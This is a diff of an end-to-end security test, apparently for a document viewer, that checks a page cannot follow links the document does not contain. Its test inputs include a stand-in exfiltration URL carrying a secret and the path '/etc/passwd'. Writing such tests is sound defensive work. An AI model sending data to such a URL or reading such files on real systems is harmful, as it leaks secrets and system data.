@@ -75,8 +75,8 @@ test('the page cannot open a URL or file the document does not link to (SR-04, S
   try {
     await expect(heading(page)).toBeVisible();
     const results = await page.evaluate(async () => {
-      const [record] = await window.galeo.documents.list();
-      const follow = (href: string) => window.galeo.documents.followLink(record!.id, href);
+      const { tabs: [record] } = await window.galeo.tabs.snapshot();
+      const follow = (href: string) => window.galeo.documents.followLink(record!.id, href, 'current');
       return [
         await follow('https://exfil.example/?secret=1'),
         await follow('/etc/passwd'),
